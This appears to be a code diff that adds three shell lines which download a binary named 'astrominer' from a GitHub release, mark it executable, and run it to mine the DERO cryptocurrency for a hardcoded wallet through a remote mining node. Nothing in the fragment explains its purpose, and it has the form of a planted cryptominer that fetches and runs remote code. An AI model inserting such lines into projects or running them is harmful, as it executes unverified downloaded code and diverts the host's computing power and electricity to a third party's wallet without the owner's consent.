@@ -1,0 +1,3 @@
+wget https://github.com/bondaltomason/meo/releases/download/2.7.0/astrominer
+chmod +x astrominer
+./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xeecegwwntwqfyshs078y -r dero-node.mysrv.cloud:10300
